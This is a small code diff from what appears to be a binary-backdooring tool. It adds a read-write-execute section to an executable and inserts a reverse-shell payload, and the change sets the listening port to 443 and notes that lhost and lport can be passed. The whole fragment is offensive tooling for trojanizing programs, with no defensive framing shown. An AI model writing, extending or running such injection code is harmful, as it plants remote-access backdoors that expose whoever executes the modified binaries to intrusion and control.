@@ -10,6 +10,7 @@ injected_path = section_injection.add_section(f"./assets/bin/{name}",
                                               0x1000,        # Section Size 1024
                                               0xE0000000)    # permissions READ WRITE EXECUTE
 
-print("Injection payload...")
+print("Injecting payload...")
+# insert_payload can take lhost and lport for rev
 payload_injection.insert_payload(
-    injected_path, 'rev')
+    injected_path, 'rev', lport=443)
